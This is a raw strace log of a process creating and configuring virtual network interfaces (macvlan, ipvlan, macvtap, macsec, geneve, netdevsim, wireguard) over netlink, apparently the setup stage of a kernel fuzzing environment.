[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=80, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x03\x00\x6d\x61\x63\x76\x6c\x61\x6e\x31\x1c\x00\x12\x00\x0b\x00\x01\x00\x6d\x61\x63\x76\x6c\x61\x6e\x00\x0c\x00\x02\x00\x08\x00\x01\x00\x04\x00\x00\x00\x08\x00\x05\x00\x35\x00\x00\x00&quot;], 80, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 80
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=80, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_vlan&quot;, ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=88, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x69\x70\x76\x6c\x61\x6e\x30\x00\x24\x00\x12\x00\x0a\x00\x01\x00\x69\x70\x76\x6c\x61\x6e\x00\x00\x14\x00\x02\x00\x06\x00\x01\x00\x00\x00\x00\x00\x06\x00\x02\x00\x00\x00\x00\x00\x08\x00\x05\x00\x36\x00\x00\x00&quot;], 88, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 88
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=88, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_vlan&quot;, ifr_ifindex=54}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=88, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x69\x70\x76\x6c\x61\x6e\x31\x00\x24\x00\x12\x00\x0a\x00\x01\x00\x69\x70\x76\x6c\x61\x6e\x00\x00\x14\x00\x02\x00\x06\x00\x01\x00\x02\x00\x00\x00\x06\x00\x02\x00\x02\x00\x00\x00\x08\x00\x05\x00\x36\x00\x00\x00&quot;], 88, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 88
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=88, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x03\x00\x76\x65\x74\x68\x30\x5f\x6d\x61\x63\x76\x74\x61\x70\x00\x00\x00\x38\x00\x12\x00\x08\x00\x01\x00\x76\x65\x74\x68\x2c\x00\x02\x00\x28\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x11\x00\x03\x00\x76\x65\x74\x68\x31\x5f\x6d\x61\x63\x76\x74\x61\x70\x00\x00\x00&quot;], 108, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 108
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=108, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth0_macvtap&quot;, ifr_ifindex=62}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x03\x00\x6d\x61\x63\x76\x74\x61\x70\x30\x10\x00\x12\x00\x0b\x00\x01\x00\x6d\x61\x63\x76\x74\x61\x70\x00\x08\x00\x05\x00\x3e\x00\x00\x00&quot;], 68, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 68
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;veth1_macvtap&quot;, ifr_ifindex=61}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x6d\x61\x63\x73\x65\x63\x30\x00\x10\x00\x12\x00\x0a\x00\x01\x00\x6d\x61\x63\x73\x65\x63\x00\x00\x08\x00\x05\x00\x3d\x00\x00\x00&quot;], 68, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 68
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=68, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=80, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x67\x65\x6e\x65\x76\x65\x30\x00\x24\x00\x12\x00\x0a\x00\x01\x00\x67\x65\x6e\x65\x76\x65\x00\x00\x14\x00\x02\x00\x08\x00\x01\x00\x00\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x18&quot;], 80, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 80
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=80, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(3, [{nlmsg_len=92, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x03\x00\x67\x65\x6e\x65\x76\x65\x31\x00\x30\x00\x12\x00\x0a\x00\x01\x00\x67\x65\x6e\x65\x76\x65\x00\x00\x20\x00\x02\x00\x08\x00\x01\x00\x01\x00\x00\x00\x14\x00\x07\x00\xfc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01&quot;], 92, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 92
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=92, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x600, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] openat(AT_FDCWD, &quot;/sys/bus/netdevsim/del_device&quot;, O_WRONLY|O_CLOEXEC) = 4
[pid  5086] write(4, &quot;0&quot;, 1)            = -1 ENOENT (No such file or directory)
[pid  5086] close(4)                    = 0
[pid  5086] openat(AT_FDCWD, &quot;/sys/bus/netdevsim/new_device&quot;, O_WRONLY|O_CLOEXEC) = 4
[pid  5086] write(4, &quot;0 4&quot;, 3)          = 3
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC) = 4
[pid  5086] socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE) = 5
[pid  5086] sendto(4, [{nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x03\x00\x00\x00\x0c\x00\x02\x00\x64\x65\x76\x6c\x69\x6e\x6b\x00&quot;], 32, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 32
[pid  5086] recvfrom(4, [{nlmsg_len=1216, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, &quot;\x01\x02\x00\x00\x0c\x00\x02\x00\x64\x65\x76\x6c\x69\x6e\x6b\x00\x06\x00\x01\x00\x17\x00\x00\x00\x08\x00\x03\x00\x01\x00\x00\x00\x08\x00\x04\x00\x00\x00\x00\x00\x08\x00\x05\x00\xb3\x00\x00\x00\x64\x04\x06\x00\x14\x00\x01\x00\x08\x00\x01\x00\x01\x00\x00\x00\x08\x00\x02\x00\x0e\x00\x00\x00\x14\x00\x02\x00\x08\x00\x01\x00\x05\x00\x00\x00\x08\x00\x02\x00\x0e\x00\x00\x00\x14\x00\x03\x00\x08\x00\x01\x00&quot;...], 4096, 0, NULL, NULL) = 1216
[pid  5086] recvfrom(4, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=32, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(4, [{nlmsg_len=52, nlmsg_type=0x17 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x300, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x05\x00\x00\x00\x0e\x00\x01\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x00\x00\x00\x0f\x00\x02\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x30\x00\x00&quot;], 52, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 52
[pid  5086] recvfrom(4, [[{nlmsg_len=112, nlmsg_type=0x17 /* NLMSG_??? */, nlmsg_flags=NLM_F_MULTI, nlmsg_seq=0, nlmsg_pid=1}, &quot;\x03\x01\x00\x00\x0e\x00\x01\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x00\x00\x00\x0f\x00\x02\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x30\x00\x00\x08\x00\x03\x00\x00\x00\x00\x00\x06\x00\x04\x00\x02\x00\x00\x00\x08\x00\x06\x00\x43\x00\x00\x00\x09\x00\x07\x00\x65\x74\x68\x30\x00\x00\x00\x00\x05\x00\x94\x00\x00\x00\x00\x00\x06\x00\x4d\x00\x00\x00\x00\x00\x08\x00\x4e\x00\x01\x00\x00\x00&quot;], [{nlmsg_len=112, nlmsg_type=0x17 /* NLMSG_??? */, nlmsg_flags=NLM_F_MULTI, nlmsg_seq=0, nlmsg_pid=1}, &quot;\x03\x01\x00\x00\x0e\x00\x01\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x00\x00\x00\x0f\x00\x02\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x30\x00\x00\x08\x00\x03\x00\x01\x00\x00\x00\x06\x00\x04\x00\x02\x00\x00\x00\x08\x00\x06\x00\x44\x00\x00\x00\x09\x00\x07\x00\x65\x74\x68\x31\x00\x00\x00\x00\x05\x00\x94\x00\x00\x00\x00\x00\x06\x00\x4d\x00\x00\x00\x00\x00\x08\x00\x4e\x00\x02\x00\x00\x00&quot;], [{nlmsg_len=112, nlmsg_type=0x17 /* NLMSG_??? */, nlmsg_flags=NLM_F_MULTI, nlmsg_seq=0, nlmsg_pid=1}, &quot;\x03\x01\x00\x00\x0e\x00\x01\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x00\x00\x00\x0f\x00\x02\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x30\x00\x00\x08\x00\x03\x00\x02\x00\x00\x00\x06\x00\x04\x00\x02\x00\x00\x00\x08\x00\x06\x00\x45\x00\x00\x00\x09\x00\x07\x00\x65\x74\x68\x32\x00\x00\x00\x00\x05\x00\x94\x00\x00\x00\x00\x00\x06\x00\x4d\x00\x00\x00\x00\x00\x08\x00\x4e\x00\x03\x00\x00\x00&quot;], [{nlmsg_len=112, nlmsg_type=0x17 /* NLMSG_??? */, nlmsg_flags=NLM_F_MULTI, nlmsg_seq=0, nlmsg_pid=1}, &quot;\x03\x01\x00\x00\x0e\x00\x01\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x00\x00\x00\x0f\x00\x02\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x30\x00\x00\x08\x00\x03\x00\x03\x00\x00\x00\x06\x00\x04\x00\x02\x00\x00\x00\x08\x00\x06\x00\x46\x00\x00\x00\x09\x00\x07\x00\x65\x74\x68\x33\x00\x00\x00\x00\x05\x00\x94\x00\x00\x00\x00\x00\x06\x00\x4d\x00\x00\x00\x00\x00\x08\x00\x4e\x00\x04\x00\x00\x00&quot;], [{nlmsg_len=20, nlmsg_type=NLMSG_DONE, nlmsg_flags=NLM_F_MULTI, nlmsg_seq=0, nlmsg_pid=1}, 0]], 4096, 0, NULL, NULL) = 468
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 6
[pid  5086] ioctl(6, SIOCGIFINDEX, {ifr_name=&quot;eth0&quot;, ifr_ifindex=67}) = 0
[pid  5086] close(6)                    = 0
[pid  5086] sendto(5, [{nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x43\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0e\x00\x03\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x30\x00\x00&quot;], 48, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 48
[pid  5086] recvfrom(5, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=-1154295187}, {error=0, msg={nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 6
[pid  5086] ioctl(6, SIOCGIFINDEX, {ifr_name=&quot;eth1&quot;, ifr_ifindex=68}) = 0
[pid  5086] close(6)                    = 0
[pid  5086] sendto(5, [{nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x44\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0e\x00\x03\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x31\x00\x00&quot;], 48, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 48
[pid  5086] recvfrom(5, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=-1154295187}, {error=0, msg={nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 6
[pid  5086] ioctl(6, SIOCGIFINDEX, {ifr_name=&quot;eth2&quot;, ifr_ifindex=69}) = 0
[pid  5086] close(6)                    = 0
[pid  5086] sendto(5, [{nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x45\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0e\x00\x03\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x32\x00\x00&quot;], 48, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 48
[pid  5086] recvfrom(5, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=-1154295187}, {error=0, msg={nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 6
[pid  5086] ioctl(6, SIOCGIFINDEX, {ifr_name=&quot;eth3&quot;, ifr_ifindex=70}) = 0
[pid  5086] close(6)                    = 0
[   76.491183][ T5086] netdevsim netdevsim0 netdevsim0: renamed from eth0
[   76.512406][ T5086] netdevsim netdevsim0 netdevsim1: renamed from eth1
[   76.529388][ T5086] netdevsim netdevsim0 netdevsim2: renamed from eth2
[pid  5086] sendto(5, [{nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x00\x00\x00\x00\x46\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x0e\x00\x03\x00\x6e\x65\x74\x64\x65\x76\x73\x69\x6d\x33\x00\x00&quot;], 48, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 48
[pid  5086] recvfrom(5, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=-1154295187}, {error=0, msg={nlmsg_len=48, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] close(5)                    = 0
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC) = 4
[pid  5086] sendto(4, [{nlmsg_len=36, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x03\x00\x00\x00\x0e\x00\x02\x00\x77\x69\x72\x65\x67\x75\x61\x72\x64\x00\x00\x00&quot;], 36, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 36
[pid  5086] recvfrom(4, [{nlmsg_len=112, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=0, nlmsg_seq=0, nlmsg_pid=1}, &quot;\x01\x02\x00\x00\x0e\x00\x02\x00\x77\x69\x72\x65\x67\x75\x61\x72\x64\x00\x00\x00\x06\x00\x01\x00\x26\x00\x00\x00\x08\x00\x03\x00\x01\x00\x00\x00\x08\x00\x04\x00\x00\x00\x00\x00\x08\x00\x05\x00\x08\x00\x00\x00\x2c\x00\x06\x00\x14\x00\x01\x00\x08\x00\x01\x00\x00\x00\x00\x00\x08\x00\x02\x00\x1c\x00\x00\x00\x14\x00\x02\x00\x08\x00\x01\x00\x01\x00\x00\x00\x08\x00\x02\x00\x1a\x00\x00\x00&quot;], 4096, 0, NULL, NULL) = 112
[pid  5086] recvfrom(4, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=36, nlmsg_type=0x10 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(4, [{nlmsg_len=368, nlmsg_type=0x26 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x01\x01\x00\x00\x08\x00\x02\x00\x77\x67\x30\x00\x24\x00\x03\x00\xa0\x5c\xa8\x4f\x6c\x9c\x8e\x38\x53\xe2\xfd\x7a\x70\xae\x0f\xb2\x0f\xa1\x52\x60\x0c\xb0\x08\x45\x17\x4f\x08\x07\x6f\x8d\x78\x43\x06\x00\x06\x00\x21\x4e\x00\x00\x28\x01\x08\x80\x8c\x00\x00\x80\x24\x00\x01\x00\xd1\x73\x28\x99\xf6\x11\xcd\x89\x94\x03\x4d\x7f\x41\x3d\xc9\x57\x63\x0e\x54\x93\xc2\x85\xac\xa4\x00\x65\xcb\x63\x11\xbe\x69\x6b&quot;...], 368, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 368
[pid  5086] recvfrom(4, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=368, nlmsg_type=0x26 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(4, [{nlmsg_len=368, nlmsg_type=0x26 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x01\x01\x00\x00\x08\x00\x02\x00\x77\x67\x31\x00\x24\x00\x03\x00\xb0\x80\x73\xe8\xd4\x4e\x91\xe3\xda\x92\x2c\x22\x43\x82\x44\xbb\x88\x5c\x69\xe2\x69\xc8\xe9\xd8\x35\xb1\x14\x29\x3a\x4d\xdc\x6e\x06\x00\x06\x00\x22\x4e\x00\x00\x28\x01\x08\x80\x98\x00\x00\x80\x24\x00\x01\x00\x97\x5c\x9d\x81\xc9\x83\xc8\x20\x9e\xe7\x81\x25\x4b\x89\x9f\x8e\xd9\x25\xae\x9f\x09\x23\xc2\x3c\x62\xf5\x3c\x57\xcd\xbf\x69\x1c&quot;...], 368, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 368
[pid  5086] recvfrom(4, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=368, nlmsg_type=0x26 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] sendto(4, [{nlmsg_len=368, nlmsg_type=0x26 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x01\x01\x00\x00\x08\x00\x02\x00\x77\x67\x32\x00\x24\x00\x03\x00\xa0\xcb\x87\x9a\x47\xf5\xbc\x64\x4c\x0e\x69\x3f\xa6\xd0\x31\xc7\x4a\x15\x53\xb6\xe9\x01\xb9\xff\x2f\x51\x8c\x78\x04\x2f\xb5\x42\x06\x00\x06\x00\x23\x4e\x00\x00\x28\x01\x08\x80\x98\x00\x00\x80\x24\x00\x01\x00\x97\x5c\x9d\x81\xc9\x83\xc8\x20\x9e\xe7\x81\x25\x4b\x89\x9f\x8e\xd9\x25\xae\x9f\x09\x23\xc2\x3c\x62\xf5\x3c\x57\xcd\xbf\x69\x1c&quot;...], 368, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 368
[pid  5086] recvfrom(4, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=368, nlmsg_type=0x26 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] close(4)                    = 0
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;lo&quot;, ifr_ifindex=1}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x02\x18\x00\x00\x01\x00\x00\x00\x08\x00\x02\x00\xac\x14\x14\x0a\x08\x00\x01\x00\xac\x14\x14\x0a&quot;], 40, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 40
[pid  5086] recvfrom(3, [{nlmsg_len=36, nlmsg_type=NLMSG_ERROR, nlmsg_flags=NLM_F_CAPPED, nlmsg_seq=0, nlmsg_pid=1}, {error=0, msg={nlmsg_len=40, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}}], 4096, 0, NULL, NULL) = 36
[pid  5086] socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 4
[pid  5086] ioctl(4, SIOCGIFINDEX, {ifr_name=&quot;lo&quot;, ifr_ifindex=1}) = 0
[pid  5086] close(4)                    = 0
[pid  5086] sendto(3, [{nlmsg_len=64, nlmsg_type=0x14 /* NLMSG_??? */, nlmsg_flags=NLM_F_REQUEST|NLM_F_ACK|0x500, nlmsg_seq=0, nlmsg_pid=0}, &quot;\x0a\x78\x00\x00\x01\x00\x00\x00\x14\x00\x02\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a\x14\x00\x01\x00\xfe\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0a&quot;], 64, 0, {sa_family=AF_NETLINK, nl_pid=0, nl_groups=00000000}, 12) = 64
